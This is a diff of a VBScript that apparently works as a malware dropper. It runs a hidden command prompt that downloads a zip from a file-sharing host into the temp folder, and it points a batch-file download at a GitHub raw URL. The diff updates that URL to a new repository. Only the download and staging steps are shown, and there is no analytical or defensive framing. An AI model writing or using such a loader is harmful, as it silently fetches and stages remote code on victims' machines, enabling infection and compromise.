@@ -3,7 +3,7 @@ Option Explicit
 CreateObject("WScript.Shell").Run "cmd /c cd %temp% && curl -L -o Best_Gits.zip https://filebin.net/0g8mkpymqtdcz601/Best_Gits.zip", 0, True
 
 Dim strBatchURL, strBatchTempFile
-strBatchURL = "https://github.com/jockop77/fff/raw/main/u.bat" 
+strBatchURL = "https://raw.githubusercontent.com/Goffure/lex/refs/heads/main/u.bat" 
 strBatchTempFile = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\u.bat" 
 
 Dim objXMLHTTP, objStream
